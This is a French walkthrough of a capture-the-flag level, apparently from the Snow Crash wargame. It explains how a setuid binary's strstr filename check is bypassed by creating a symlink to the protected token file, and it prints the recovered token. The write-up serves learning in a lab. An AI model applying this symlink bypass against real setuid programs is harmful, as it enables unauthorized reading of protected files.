## Level 08: 
  
1.  inspection des fichiers  
    Suite au login, on remarque 2 fichiers présents: un éxecutable `level08` et un fichier `token`.  
    - On essaie d'abord d'éxecuter le binaire avec la commande ```./level08```:
        ```bash
        ./level08 [file to read] 
        ```
    - On essaie donc d'éxecuter le binaire en donnant `token` comme argument avec la commande ```./level08 token```:
        ```bash
        You may not access 'token' 
        ```
    - On essaie d'inspecter le contenu de token avec la commande ```cat token```:
        ```bash
        cat: token: Permission denied
        ```
    - On inspecte alors les permissions des fichiers avec la commande ```ls -la level08 token```:
        ```bash
        -rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
        -rw-------  1 flag08 flag08    26 Mar  5  2016 token
        ```
    
    On comprend alors que le fichier `token` a des permissions strictes : il est uniquement accessible en lecture et écriture par l'utilisateur `flag08`.  
    En revanche, l'éxecutable `level08` a une permission qui nous interesse: le `s` (bit setuid) est activé. Cela signifie que lorsqu'on éxecute le programme, on l'éxecute avec les privilèges du propriétaire : `flag08`.


2.  Analyse de l'éxecutable avec ltrace   
    Il faut maintenant comprendre pourquoi la commande ```./level08 token``` nous donne:
    ```bash
    You may not access 'token'
    ```
    Pour comprendre cela, nous allons utiliser `ltrace` car il permet de suivre les appels aux bibliothèques et d'examiner les interactions avec le système de fichiers. 
    ```bash
    ltrace -f ./level08 token
    ```
    Output:
    ```bash
    [pid 3033] __libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
    [pid 3033] strstr("token", "token")                                          = "token"
    [pid 3033] printf("You may not access '%s'\n", "token"You may not access 'token'             )                      = 27
    [pid 3033] exit(1 <unfinished ...>
    [pid 3033] +++ exited (status 1) +++
    ```
    On comprend que le programme utilise `strstr` pour vérifier si le mot `token` est présent dans le nom du fichier.  
    Ainsi, si on essaie d'éxecuter `level08` avec un fichier qui ne comporte pas le mot `token`:
    ```bash
    ltrace -f ./level08 test
    ```
    Output:
    ```bash
    [pid 3061] __libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
    [pid 3061] strstr("test", "token")                                           = NULL
    [pid 3061] open("test", 0, 014435162522)                                     = -1
    [pid 3061] err(1, 0x80487b2, 0xbffff907, 0xb7fe765d, 0xb7e3ebaflevel08: Unable to open test: No such file or directory  <unfinished ...>
    [pid 3061] +++ exited (status 1) +++
    ```
    On peut voir que le programme ne trouve pas le mot `token` et essaie donc d'ouvrir le fichier `test`, qui n'existe pas.  
    Ainsi, si la seule condition est que le fichier en argument ne comporte pas le mot `token` pour que `level08` s'éxecute, cela peut être une faille exploitable avec une création de lien symbolique.

2.  Exploitation de la faille  
    Un lien symbolique (ou symlink) est un fichier spécial qui pointe vers un autre fichier ou répertoire. Il fonctionne comme un raccourci.  
    Cela permet au programme d'accéder indirectement au fichier `token` sans qu'il sache qu'il s'agit du fichier `token` au sens strict, échappant alors à la vérification par `strstr`.  
    On va donc créer un lien symbolique avec le fichier `token`, sans utiliser le mot `token`:
    ```bash
    ln -s /home/user/level08/token /tmp/test
    ```
    `ln` est la commande Linux utilisée pour créer des liens (hard links ou symbolic links, selon l'option utilisée).  
    Par défaut, `ln` crée un hard link, mais ici, l'option `-s` est spécifiée, ce qui signifie que la commande créera un lien symbolique (symlink). Contrairement à un hard link, un lien symbolique peut pointer vers un fichier ou répertoire situé sur un autre système de fichiers.

    Ouput:
    ```bash
    quif5eloekouj29ke0vouxean 
    ```

